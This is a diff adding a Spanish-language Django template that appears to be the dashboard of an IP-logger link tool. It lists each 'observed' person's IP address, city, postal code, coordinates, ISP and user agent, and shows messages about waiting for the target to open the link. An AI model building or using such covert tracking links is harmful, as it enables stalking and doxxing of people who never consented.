@@ -1,0 +1,31 @@
+{% extends 'base/base.html' %}
+
+{% block title %} {% endblock %}
+
+{% block header %} 
+
+{% endblock %}
+
+{% block content %}
+    {% if datos %}
+        {% for i in datos %}
+            <a id="link1" class="alert-link">127.0.0.1:8000{% url 'horus' i.id %}</a>
+            {{i.ip}}
+            {{i.pais}}
+            {{i.estado}}
+            {{i.ciudad}}
+            {{i.cp}}
+            {{i.latitud}}
+            {{i.longitud}}
+            {{i.proveedor}}
+            {{i.useragent}}
+            {% if i.completo == True%}
+                <h6>Estos datos se eliminaran en aproximadamente 15 minutos, no olvide guardarlos</h6><br>
+            {% else %}
+                <h6>Estamos esperando al obsevado :)<br> En aproximadamente 1 hora el link observador expirara</h6>
+            {% endif %}
+        {% endfor %}
+    {% else %}
+        <h5>Aun no has observado a nadie :( </h5>
+    {% endif %}
+{% endblock %}
